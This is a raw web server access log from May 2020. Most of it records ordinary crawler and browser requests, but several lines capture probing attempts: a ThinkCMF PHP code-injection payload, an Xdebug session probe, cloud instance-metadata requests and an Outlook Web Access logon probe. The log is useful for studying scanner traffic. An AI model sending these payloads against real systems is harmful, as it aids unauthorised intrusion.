[Sun May 17 2020 23:29:46 GMT+0000 (UTC)]  "[36mGET[39m [36m/robots.txt[39m" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
[Sun May 17 2020 23:29:46 GMT+0000 (UTC)]  "[31mGET[39m [31m/robots.txt[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 23:29:46 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
[Sun May 17 2020 23:29:46 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 23:29:46 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
[Sun May 17 2020 23:29:47 GMT+0000 (UTC)]  "[36mGET[39m [36m/robots.txt[39m" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
[Sun May 17 2020 23:29:47 GMT+0000 (UTC)]  "[31mGET[39m [31m/robots.txt[39m" Error ([31m404[39m): "[31mNot found[39m"
[Sun May 17 2020 23:29:47 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
[Sun May 17 2020 23:29:47 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Mon May 18 2020 00:50:45 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Mon May 18 2020 01:06:38 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Mon May 18 2020 01:46:09 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Mon May 18 2020 01:46:10 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Mon May 18 2020 01:46:11 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Mon May 18 2020 01:46:12 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Mon May 18 2020 01:46:12 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Mon May 18 2020 01:46:13 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Mon May 18 2020 01:46:13 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Mon May 18 2020 02:18:55 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "undefined"
[Mon May 18 2020 02:25:56 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Mon May 18 2020 03:09:12 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
[Mon May 18 2020 03:34:13 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
[Mon May 18 2020 05:14:06 GMT+0000 (UTC)]  "[36mGET[39m [36m/favicon.ico[39m" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
[Mon May 18 2020 05:14:06 GMT+0000 (UTC)]  "[31mGET[39m [31m/favicon.ico[39m" Error ([31m404[39m): "[31mNot found[39m"
[Mon May 18 2020 08:15:33 GMT+0000 (UTC)]  "[36mGET[39m [36m/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Mon May 18 2020 08:15:35 GMT+0000 (UTC)]  "[36mGET[39m [36m/?XDEBUG_SESSION_START=phpstorm[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Mon May 18 2020 08:17:45 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
[Mon May 18 2020 09:19:16 GMT+0000 (UTC)]  "[36mGET[39m [36m/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f[39m" "Mozilla/5.0 zgrab/0.x"
[Mon May 18 2020 09:19:16 GMT+0000 (UTC)]  "[31mGET[39m [31m/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f[39m" Error ([31m404[39m): "[31mNot found[39m"
[Mon May 18 2020 12:07:54 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 "
[Mon May 18 2020 12:24:50 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Mon May 18 2020 12:24:51 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Mon May 18 2020 12:24:52 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "AWS Security Scanner"
[Mon May 18 2020 12:24:53 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Mon May 18 2020 12:24:53 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Mon May 18 2020 12:24:54 GMT+0000 (UTC)]  "[36mGET[39m [36m/latest/dynamic/instance-identity/document[39m" "AWS Security Scanner"
[Mon May 18 2020 12:24:54 GMT+0000 (UTC)]  "[31mGET[39m [31m/latest/dynamic/instance-identity/document[39m" Error ([31m404[39m): "[31mNot found[39m"
[Mon May 18 2020 13:31:24 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
[Mon May 18 2020 14:24:38 GMT+0000 (UTC)]  "[36mGET[39m [36m/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Mon May 18 2020 14:24:38 GMT+0000 (UTC)]  "[36mGET[39m [36m/?XDEBUG_SESSION_START=phpstorm[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
[Mon May 18 2020 15:56:23 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (compatible, MSIE 10.0, Windows NT, DigExt)"
[Mon May 18 2020 16:19:15 GMT+0000 (UTC)]  "[36mGET[39m [36m/[39m" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
